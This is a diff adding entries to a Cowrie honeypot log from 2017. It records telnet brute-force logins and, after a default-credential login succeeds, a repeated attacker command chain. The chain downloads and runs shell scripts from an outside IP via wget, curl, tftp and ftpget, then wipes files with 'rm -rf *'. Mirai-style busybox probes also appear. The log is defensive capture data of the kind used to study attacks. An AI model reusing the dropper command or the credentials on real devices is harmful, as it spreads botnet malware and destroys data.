@@ -4817,3 +4817,190 @@
 2017-06-16T19:11:59+0000 [CowrieTelnetTransport,23,201.88.176.32] Connection lost after 145 seconds
 2017-06-16T19:11:59+0000 [CowrieTelnetTransport,30,45.76.171.177] login attempt: 765
 2017-06-16T19:11:59+0000 [CowrieTelnetTransport,30,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-16T19:12:02+0000 [CowrieTelnetTransport,30,45.76.171.177] login attempt [enable/shell] failed
+2017-06-16T19:12:02+0000 [CowrieTelnetTransport,30,45.76.171.177] Warning: state changed and new state returned
+2017-06-16T19:12:03+0000 [CowrieTelnetTransport,30,45.76.171.177] login attempt: 766
+2017-06-16T19:12:03+0000 [CowrieTelnetTransport,30,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-16T19:12:05+0000 [CowrieTelnetTransport,30,45.76.171.177] login attempt [sh/cd /tmp; wget http://46.166.185.210/fyfa.sh; curl -O http://46.166.185.210/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 46.166.185.210 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 46.166.185.210; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
+2017-06-16T19:12:05+0000 [CowrieTelnetTransport,30,45.76.171.177] Warning: state changed and new state returned
+2017-06-16T19:12:05+0000 [-] Process ended. Telnet Session disconnected
+2017-06-16T19:12:05+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 101.228.184.50:37610 (10.8.41.81:2222) [session: 7b347ca5]
+2017-06-16T19:12:05+0000 [CowrieTelnetTransport,27,45.76.171.177] Connection lost after 48 seconds
+2017-06-16T19:12:05+0000 [CowrieTelnetTransport,22,166.62.199.145] Closing TTY Log: log/tty/20170616-190902-None-22i.log after 183 seconds
+2017-06-16T19:12:05+0000 [CowrieTelnetTransport,22,166.62.199.145] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-16T19:12:05+0000 [CowrieTelnetTransport,22,166.62.199.145] Connection lost after 188 seconds
+2017-06-16T19:12:06+0000 [CowrieTelnetTransport,31,45.76.171.177] login attempt: 767
+2017-06-16T19:12:06+0000 [CowrieTelnetTransport,31,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-16T19:12:09+0000 [CowrieTelnetTransport,31,45.76.171.177] login attempt [enable/shell] failed
+2017-06-16T19:12:09+0000 [CowrieTelnetTransport,31,45.76.171.177] Warning: state changed and new state returned
+2017-06-16T19:12:09+0000 [CowrieTelnetTransport,31,45.76.171.177] login attempt: 768
+2017-06-16T19:12:09+0000 [CowrieTelnetTransport,31,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-16T19:12:12+0000 [CowrieTelnetTransport,31,45.76.171.177] login attempt [sh/cd /tmp; wget http://46.166.185.210/fyfa.sh; curl -O http://46.166.185.210/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 46.166.185.210 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 46.166.185.210; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
+2017-06-16T19:12:12+0000 [CowrieTelnetTransport,31,45.76.171.177] Warning: state changed and new state returned
+2017-06-16T19:12:12+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 45.76.171.177:56799 (10.8.41.81:2223) [session: TT32]
+2017-06-16T19:12:12+0000 [CowrieTelnetTransport,28,45.76.171.177] Connection lost after 54 seconds
+2017-06-16T19:12:17+0000 [HoneyPotSSHTransport,16,113.195.145.52] connection lost
+2017-06-16T19:12:17+0000 [HoneyPotSSHTransport,16,113.195.145.52] Connection lost after 33 seconds
+2017-06-16T19:12:18+0000 [CowrieTelnetTransport,32,45.76.171.177] login attempt: 769
+2017-06-16T19:12:18+0000 [CowrieTelnetTransport,32,45.76.171.177] login return, expect: [admin/meinsm]
+2017-06-16T19:12:20+0000 [CowrieTelnetTransport,32,45.76.171.177] login attempt [admin/meinsm] succeeded
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] Opening TTY Log: log/tty/20170616-191222-None-32i.log
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] Warning: state changed and new state returned
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,29,45.76.171.177] Connection lost after 61 seconds
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: enable
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: enable 
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: shell
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] Command not found: shell
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: sh
+2017-06-16T19:12:22+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: sh 
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: cd /tmp; wget http://46.166.185.210/fyfa.sh; curl -O http://46.166.185.210/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 46.166.185.210 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 46.166.185.210; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cd /tmp
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: wget http://46.166.185.210/fyfa.sh
+2017-06-16T19:12:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Not storing duplicate content b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.210/fyfa.sh) with SHA-256 b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c to dl/b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: curl -O http://46.166.185.210/fyfa.sh
+2017-06-16T19:12:23+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Not storing duplicate content b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.210/fyfa.sh) with SHA-256 b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c to dl/b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/fyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: sh /tmp/fyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: tftp 46.166.185.210 -c get tfyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: sh tfyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: tftp -r tfyfa2.sh -g 46.166.185.210
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa2.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: sh tfyfa2.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://46.166.185.210/ftp1.sh) with SHA-256 4d263bc22e43dd33014aa345e94e01786042fb642762e9be3bee8ed3e2a2083e to dl/4d263bc22e43dd33014aa345e94e01786042fb642762e9be3bee8ed3e2a2083e
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: sh /tmp/ftp1.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh /tmp/ftp1.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/.X11-unix /tmp/.ICE-unix
+2017-06-16T19:12:23+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: /bin/busybox ECCHI
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox ECCHI
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: /bin/busybox ps; /bin/busybox ECCHI
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox ps
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: ps
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox ECCHI
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: cd /tmp; wget http://46.166.185.210/fyfa.sh; curl -O http://46.166.185.210/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 46.166.185.210 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 46.166.185.210; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cd /tmp
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: wget http://46.166.185.210/fyfa.sh
+2017-06-16T19:12:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Not storing duplicate content b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.210/fyfa.sh) with SHA-256 b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c to dl/b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: curl -O http://46.166.185.210/fyfa.sh
+2017-06-16T19:12:23+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Not storing duplicate content b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.210/fyfa.sh) with SHA-256 b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c to dl/b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/fyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: sh /tmp/fyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: tftp 46.166.185.210 -c get tfyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: sh tfyfa.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: tftp -r tfyfa2.sh -g 46.166.185.210
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa2.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: sh tfyfa2.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://46.166.185.210/ftp1.sh) with SHA-256 4d263bc22e43dd33014aa345e94e01786042fb642762e9be3bee8ed3e2a2083e to dl/4d263bc22e43dd33014aa345e94e01786042fb642762e9be3bee8ed3e2a2083e
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: sh /tmp/ftp1.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh /tmp/ftp1.sh
+2017-06-16T19:12:23+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-06-16T19:12:23+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox cat /proc/mounts
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cat /proc/mounts
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox ECCHI
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: echo -e '\x6b\x61\x6d\x69/dev'
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox cat /dev/.nippon
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cat /dev/.nippon
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox rm /dev/.nippon
+2017-06-16T19:12:23+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: rm /dev/.nippon
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: /bin/busybox ECCHI
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox ECCHI
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.human
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: rm /dev/.t
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: rm /dev/.sh
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: rm /dev/.human
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: cd /dev/
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cd /dev
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox cp /bin/echo dvrHelper
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cp /bin/echo dvrHelper
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: > /dev/dvrHelper
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox chmod 777 /dev/dvrHelper
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: chmod 777 /dev/dvrHelper
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox ECCHI
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: cd /tmp; wget http://46.166.185.210/fyfa.sh; curl -O http://46.166.185.210/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 46.166.185.210 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 46.166.185.210; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cd /tmp
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: wget http://46.166.185.210/fyfa.sh
+2017-06-16T19:12:24+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,24,216.120.247.147] Closing TTY Log: log/tty/20170616-191019-None-24i.log after 125 seconds
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,24,216.120.247.147] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,24,216.120.247.147] Connection lost after 133 seconds
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Not storing duplicate content b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.210/fyfa.sh) with SHA-256 b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c to dl/b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: curl -O http://46.166.185.210/fyfa.sh
+2017-06-16T19:12:24+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:24+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Not storing duplicate content b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.210/fyfa.sh) with SHA-256 b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c to dl/b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/fyfa.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: sh /tmp/fyfa.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: tftp 46.166.185.210 -c get tfyfa.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: sh tfyfa.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: tftp -r tfyfa2.sh -g 46.166.185.210
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa2.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: sh tfyfa2.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://46.166.185.210/ftp1.sh) with SHA-256 4d263bc22e43dd33014aa345e94e01786042fb642762e9be3bee8ed3e2a2083e to dl/4d263bc22e43dd33014aa345e94e01786042fb642762e9be3bee8ed3e2a2083e
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: sh /tmp/ftp1.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh /tmp/ftp1.sh
+2017-06-16T19:12:24+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-06-16T19:12:24+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: /bin/busybox cat /bin/echo
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox cat /bin/echo
+2017-06-16T19:12:24+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cat /bin/echo
+2017-06-16T19:12:25+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: /bin/busybox ECCHI
+2017-06-16T19:12:25+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: /bin/busybox ECCHI
+2017-06-16T19:12:25+0000 [CowrieTelnetTransport,32,45.76.171.177] CMD: cd /tmp; wget http://46.166.185.210/fyfa.sh; curl -O http://46.166.185.210/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 46.166.185.210 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 46.166.185.210; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *
+2017-06-16T19:12:25+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: cd /tmp
+2017-06-16T19:12:25+0000 [CowrieTelnetTransport,32,45.76.171.177] Command found: wget http://46.166.185.210/fyfa.sh
+2017-06-16T19:12:25+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Not storing duplicate content b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.210/fyfa.sh) with SHA-256 b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c to dl/b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: curl -O http://46.166.185.210/fyfa.sh
+2017-06-16T19:12:25+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:25+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Not storing duplicate content b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.210/fyfa.sh) with SHA-256 b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c to dl/b0d0c0824b189cb0a787062d1e2db72c6a3fde527d8c288718958ac267c3c72c
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/fyfa.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: sh /tmp/fyfa.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: tftp 46.166.185.210 -c get tfyfa.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: sh tfyfa.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: tftp -r tfyfa2.sh -g 46.166.185.210
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: chmod 777 tfyfa2.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: sh tfyfa2.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 46.166.185.210 ftp1.sh ftp1.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://46.166.185.210/ftp1.sh) with SHA-256 4d263bc22e43dd33014aa345e94e01786042fb642762e9be3bee8ed3e2a2083e to dl/4d263bc22e43dd33014aa345e94e01786042fb642762e9be3bee8ed3e2a2083e
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: sh /tmp/ftp1.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/fyfa.sh tfyfa.sh tfyfa2.sh /tmp/ftp1.sh
+2017-06-16T19:12:25+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-06-16T19:12:25+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.210/fyfa.sh>
+2017-06-16T19:12:28+0000 [HoneyPotSSHTransport,17,101.228.184.50] Remote SSH version: SSH-2.0-libssh2_1.8.1-20170115
+2017-06-16T19:12:28+0000 [HoneyPotSSHTransport,17,101.228.184.50] kex alg, key alg: 'diffie-hellman-group-exchange-sha256' 'ssh-rsa'
+2017-06-16T19:12:28+0000 [HoneyPotSSHTransport,17,101.228.184.50] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-16T19:12:28+0000 [HoneyPotSSHTransport,17,101.228.184.50] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-16T19:12:28+0000 [HoneyPotSSHTransport,17,101.228.184.50] connection lost
+2017-06-16T19:12:28+0000 [HoneyPotSSHTransport,17,101.228.184.50] Connection lost after 23 seconds
+2017-06-16T19:12:36+0000 [CowrieTelnetTransport,30,45.76.171.177] Connection lost after 55 seconds
+2017-06-16T19:12:42+0000 [CowrieTelnetTransport,31,45.76.171.177] Connection lost after 61 seconds
